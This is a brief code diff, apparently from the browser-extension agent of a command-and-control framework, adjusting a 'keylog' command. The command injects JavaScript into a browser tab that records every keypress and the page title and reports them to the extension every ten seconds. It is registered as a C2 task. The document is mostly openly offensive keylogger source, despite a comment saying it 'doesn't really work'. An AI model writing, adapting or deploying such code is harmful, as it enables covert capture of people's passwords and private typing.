@@ -1,6 +1,6 @@
 // This doesn't really work
-keylog = function(){
-    let id = Math.round(parseInt(atob(data['data'])));
+keylog = function(params){
+    let id = Math.round(parseInt(atob(params)));
     keylogTaskID = taskid;
     let kl_js = 'let keys={};keys.type=\'keylogger\';keys.window=document.title;keys.data=\'\';document.onkeypress = function(e){get = window.event?event:e;key = get.keyCode?get.keyCode:get.charCode;key = String.fromCharCode(key);keys.data+=key;};setInterval(function(){if(keys.data.length != 0){chrome.runtime.sendMessage(keys);keys.data=\'\';}}, 10000);';
     // Inject the keylogger script into tab id
@@ -22,3 +22,4 @@ keylog = function(){
 };
 
 C2.commands[keylog.name] = keylog;
+
